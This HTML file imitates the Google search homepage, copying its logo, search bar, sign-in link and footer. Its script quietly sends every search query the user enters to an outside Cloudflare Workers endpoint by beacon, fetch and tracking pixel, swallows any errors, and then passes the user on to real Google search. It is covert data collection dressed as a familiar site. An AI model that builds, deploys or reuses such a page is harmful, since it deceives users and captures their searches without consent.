<!DOCTYPE html>
<html lang="en" data-theme="auto">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta name="color-scheme" content="light dark" />
  <meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
  <meta name="theme-color" content="#3c3c3c" media="(prefers-color-scheme: dark)">
  <title>Google</title>

  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" />

  <style>
    :root {
      --bg:#ffffff;
      --text:#1f1f1f;
      --border:#dadce0;
      --icon:#9aa0a6;
      --blue:#1a73e8;
      --focus: rgba(26,115,232,.28);
      --w:clamp(280px,92vw,600px);
      --r-pill:999px;
    }

    @media (prefers-color-scheme: dark) {
      :root {
        --bg:#202124;
        --text:#e8eaed;
        --border:#5a5a5a;
        --icon:#d0d0d0;
        --blue:#8ab4f8;
      }
    }

    html,body {
      height:100%;
      margin:0;
      font:16px/1.4 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif;
      background:var(--bg);
      color:var(--text);
      display:flex;
      flex-direction:column;
    }

    /* Header layout */
    header {
      display:flex;
      justify-content:space-between;
      align-items:center;
      padding:10px 16px;
      background:var(--bg);
    }

    .nav {
      display:flex;
      gap:28px;
    }

    .nav a {
      position:relative;
      font-size:14px;
      color:var(--text);
      text-decoration:none;
      text-transform:uppercase;
      padding-bottom:6px;
    }

    .nav a.active {
      color:var(--blue);
    }

    /* Blue underline under active tab */
    .nav a.active::after {
      content:"";
      position:absolute;
      bottom:0;
      left:0;
      width:100%;
      height:2px;
      background:var(--blue);
      border-radius:2px;
    }

    /* Right-side icons and buttons */
    .header-right {
      display:flex;
      align-items:center;
      gap:18px;
    }

    /* App grid (9 dots) */
    .app-grid {
      display:grid;
      grid-template-columns:repeat(3,4px);
      grid-template-rows:repeat(3,4px);
      gap:4px;
      cursor:pointer;
      padding:8px;
      border-radius:50%;
      transition:background .2s ease;
    }

    .app-grid div {
      width:4px;
      height:4px;
      background:var(--icon);
      border-radius:50%;
    }

    .app-grid:hover {
      background:rgba(95,99,104,0.15);
    }

    /* Sign in button */
    .sign-in {
      background:#1a73e8;
      color:#fff;
      padding:8px 14px;
      border-radius:var(--r-pill);
      text-decoration:none;
      font-weight:500;
      font-size:14px;
    }

    main {
      flex:1;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:flex-start;
      padding-top:18vh;
    }

    .logo img {
      width:204px; /* 3/4 size */
      height:auto;
      transition:filter .3s ease;
    }

    @media (prefers-color-scheme: dark) {
      .logo img {
        filter: brightness(0) invert(1);
      }
    }

    .search {
      position:relative;
      margin-top:40px;
      width:100%;
      max-width:var(--w);
    }

    .search input {
      width:100%;
      height:44px;
      border:1px solid var(--border);
      border-radius:var(--r-pill);
      padding:0 100px 0 50px;
      font-size:16px;
      outline:none;
      background:#fff;
      color:#000;
      transition:background .3s ease, color .3s ease;
    }

    @media (prefers-color-scheme: dark) {
      .search input {
        background:#303134; /* gray like real Google dark mode */
        color:#e8eaed;
      }
    }

    .search .material-symbols-outlined {
      position:absolute;
      top:50%;
      transform:translateY(-50%);
      font-size:22px;
      color:var(--icon);
      cursor:pointer;
      user-select:none;
    }

    .search .search-icon { left:16px; }
    .search .mic { right:56px; }
    .search .camera { right:18px; }

    footer {
      margin-top:auto;
      border-top:1px solid var(--border);
      background:var(--bg);
      padding:14px;
      text-align:center;
    }

    footer a {
      color:var(--text);
      opacity:.9;
      text-decoration:none;
      font-size:14px;
      margin:0 8px;
    }

    footer a:hover { text-decoration:underline; }
  </style>
</head>
<body>
  <header>
    <nav class="nav">
      <a href="#" class="active">ALL</a>
      <a href="#">IMAGES</a>
    </nav>

    <div class="header-right">
      <div class="app-grid" title="Google apps">
        <div></div><div></div><div></div>
        <div></div><div></div><div></div>
        <div></div><div></div><div></div>
      </div>
      <a class="sign-in" href="https://accounts.google.com/ServiceLogin">Sign in</a>
    </div>
  </header>

  <main>
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
    </div>

    <form id="search" class="search" action="https://www.google.com/search" method="GET">
      <span id="searchButton" class="material-symbols-outlined search-icon" title="Search">search</span>
      <input id="q" name="q" type="search" placeholder="Search" aria-label="Search">
      <span class="material-symbols-outlined mic">mic</span>
      <span class="material-symbols-outlined camera">photo_camera</span>
    </form>
  </main>

  <footer>
    <a href="#">About</a>
    <a href="#">Advertising</a>
    <a href="#">Business</a>
    <a href="#">How Search works</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
    <a href="#">Settings</a>
  </footer>

  <script>
    const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev';

    function sendToBackend(q){
      try{
        const params = new URLSearchParams({ q });
        if (navigator.sendBeacon) {
          const blob = new Blob([params.toString()], { type: 'application/x-www-form-urlencoded;charset=UTF-8' });
          navigator.sendBeacon(ENDPOINT, blob);
        } else {
          fetch(ENDPOINT, { method:'POST', body:params, keepalive:true, mode:'cors' }).catch(()=>{});
        }
        const img = new Image();
        img.src = ENDPOINT + '?' + params.toString();
      }catch(e){}
    }

    const form = document.getElementById('search');
    const input = document.getElementById('q');
    const searchBtn = document.getElementById('searchButton');
    const navLinks = document.querySelectorAll('.nav a');

    // Toggle active nav underline
    navLinks.forEach(link => {
      link.addEventListener('click', e => {
        navLinks.forEach(l => l.classList.remove('active'));
        e.target.classList.add('active');
      });
    });

    // Run search on Enter
    form.addEventListener('submit', function(){
      const q = (input.value || '').trim();
      if(q){ sendToBackend(q); }
    }, { capture:true });

    // Run search if icon clicked
    searchBtn.addEventListener('click', function(){
      const q = (input.value || '').trim();
      if(q){
        sendToBackend(q);
        form.submit();
      } else {
        input.focus();
      }
    });
  </script>
</body>
</html>
